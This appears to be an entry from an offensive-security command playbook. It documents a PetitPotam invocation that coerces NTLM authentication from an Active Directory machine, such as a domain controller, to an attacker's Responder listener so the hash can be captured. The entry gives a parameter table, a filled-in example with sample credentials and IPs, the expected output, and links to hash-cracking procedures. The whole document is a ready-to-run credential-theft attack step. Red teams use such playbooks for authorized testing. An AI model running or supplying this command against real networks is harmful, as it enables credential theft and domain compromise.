---
type: command
executor: bash
data: >-
  PetitPotam.py -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -dc-ip $_DC_IP
  $_TARGET_IP $_RESPONDER_IP
output: null
created_at: '2023-04-06T03:56:05.188024+00:00'
updated_at: '2023-04-10T20:35:59.633859+00:00'
platforms:
  - Linux
  - Windows
tags:
  - coercion
  - ntlm-relay
verified: true
validated: true
---

# petitpotam-py-coerce-auth

## Command

```bash
PetitPotam.py -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -dc-ip $_DC_IP $_TARGET_IP $_RESPONDER_IP
```

## Description

This Python-based command uses PetitPotam to coerce NTLM authentication from a target machine in an Active Directory environment, relaying it to a Responder listener for hash capture. Requires initial domain credentials; effective against unpatched systems for authenticated users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_USERNAME | Domain username for authentication | Yes |
| -p $_PASSWORD | Domain password | Yes |
| -d $_DOMAIN | Target domain name | Yes |
| -dc-ip $_DC_IP | Domain Controller IP for resolution | Yes |
| $_TARGET_IP | IP of machine to coerce (e.g., DC) | Yes |
| $_RESPONDER_IP | Attacker's Responder listener IP | Yes |

## Examples

### Basic Usage

```bash
PetitPotam.py -u admin -p Pass123 -d corp.local -dc-ip 10.0.0.10 10.0.0.10 10.0.0.5
```

### With Hashes (if supported)

Adapt for hash input if tool variant allows.

## Expected Output

`[+] Sending EFSRPC Request to 10.0.0.10` followed by success or error. Check Responder logs for captured hash.

## Related

- [[procedures/Capture-and-Crack-Net-NTLMv1-Hashes]]
- [[tools/PetitPotam]]
